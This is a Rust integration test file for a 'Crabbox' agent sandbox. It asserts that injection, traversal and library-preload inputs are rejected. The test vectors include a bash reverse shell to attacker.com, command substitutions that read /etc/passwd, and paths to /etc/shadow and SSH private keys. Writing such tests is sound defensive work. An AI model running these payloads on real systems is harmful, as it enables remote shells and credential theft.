/// Phase 36 REFACTOR: Crabbox Security Integration Tests
/// End-to-end testing for LOTA mitigation, isolation enforcement, and secure execution boundaries

#[cfg(test)]
mod integration_tests {
    use crate::handlers::crabbox_security::{CrabboxSecurity, CrabboxSecurityError};

    #[tokio::test]
    async fn test_crabbox_prevents_living_off_agent_lota_completely() {
        // GIVEN: Multiple LOTA attack payloads
        // WHEN: Executing each payload in crabbox
        // THEN: All payloads rejected with EscapeAttempt
        // AND: No shell breakout possible (fail-closed)

        let lota_payloads = vec![
            "$(whoami)",
            "$(cat /etc/passwd)",
            "`id > /tmp/pwned`",
            "bash -i >& /dev/tcp/attacker.com/1234 0>&1",
            "exec /bin/sh",
            "/bin/sh -c 'whoami'",
        ];

        for payload in lota_payloads {
            let result = CrabboxSecurity::execute_in_crabbox("container-test", payload).await;
            assert!(result.is_err(), "LOTA payload {} should be rejected", payload);
            assert!(matches!(result.unwrap_err(), CrabboxSecurityError::EscapeAttempt));
        }
    }

    #[tokio::test]
    async fn test_crabbox_rejects_all_path_traversal_techniques() {
        // GIVEN: Multiple path traversal attack vectors
        // WHEN: Validating filesystem access
        // THEN: All traversal attempts rejected with PathTraversalAttempt
        // AND: Only relative safe paths accepted

        let traversal_vectors = vec![
            "../../../../etc/passwd",
            "../../../etc/shadow",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "etc/hosts",
        ];

        for path in traversal_vectors {
            let result = CrabboxSecurity::validate_filesystem_access("container", path).await;
            assert!(result.is_err(), "Path {} should be rejected", path);
            assert!(matches!(result.unwrap_err(), CrabboxSecurityError::PathTraversalAttempt));
        }
    }

    #[tokio::test]
    async fn test_crabbox_environment_isolation_blocks_library_preloading() {
        // GIVEN: Environment variables with library preload injection
        // WHEN: Validating env vars
        // THEN: LD_PRELOAD, DYLD_INSERT_LIBRARIES rejected
        // AND: Shared library injection attack blocked (fail-closed)

        let mut malicious_env = std::collections::HashMap::new();
        malicious_env.insert("LD_PRELOAD".to_string(), "/tmp/malicious.so".to_string());

        let result = CrabboxSecurity::validate_environment_variables(&malicious_env).await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), CrabboxSecurityError::EnvironmentInjection));

        let mut dyld_env = std::collections::HashMap::new();
        dyld_env.insert("DYLD_INSERT_LIBRARIES".to_string(), "/tmp/evil.dylib".to_string());

        let result2 = CrabboxSecurity::validate_environment_variables(&dyld_env).await;
        assert!(result2.is_err());
        assert!(matches!(result2.unwrap_err(), CrabboxSecurityError::EnvironmentInjection));
    }

    #[tokio::test]
    async fn test_crabbox_safe_command_execution_preserves_isolation() {
        // GIVEN: Safe commands that don't escape crabbox
        // WHEN: Executing in crabbox
        // THEN: Returns exit_code=0 and escaped_crabbox=false
        // AND: Execution remains within isolation boundaries

        let safe_commands = vec![
            "echo hello",
            "ls -la",
            "cat file.txt",
            "pwd",
            "id",
        ];

        for cmd in safe_commands {
            let result = CrabboxSecurity::execute_in_crabbox("container-safe", cmd).await;
            assert!(result.is_ok(), "Safe command {} should succeed", cmd);
            let execution = result.unwrap();
            assert_eq!(execution.exit_code, 0);
            assert!(!execution.escaped_crabbox, "Safe execution should not escape");
        }
    }

    #[tokio::test]
    async fn test_crabbox_syscall_monitoring_enforces_restricted_operations() {
        // GIVEN: Crabbox container with syscall monitoring active
        // WHEN: Monitoring for restricted syscalls
        // THEN: Returns list of allowed syscalls
        // AND: Restricted syscalls (ptrace, execve) would be blocked

        let result = CrabboxSecurity::monitor_syscalls("container-syscall").await;
        assert!(result.is_ok());
        let allowed_syscalls = result.unwrap();
        assert!(!allowed_syscalls.is_empty());
        // Verify benign syscalls in whitelist
        assert!(allowed_syscalls.contains(&"read".to_string()));
        assert!(allowed_syscalls.contains(&"write".to_string()));
    }

    #[tokio::test]
    async fn test_crabbox_multi_layer_defense_against_combined_attacks() {
        // GIVEN: Combined attack using multiple vectors (LOTA + path traversal + env injection)
        // WHEN: Executing attack payload
        // THEN: First failing defense layer blocks attack
        // AND: Agent securely halted before reaching deeper vectors

        let command = "$(cat ../../../../etc/passwd)"; // LOTA + path traversal combo
        let result = CrabboxSecurity::execute_in_crabbox("container-combined", command).await;
        assert!(result.is_err());
        // Would be caught by execute_in_crabbox as LOTA escape attempt
        assert!(matches!(result.unwrap_err(), CrabboxSecurityError::EscapeAttempt));
    }
}
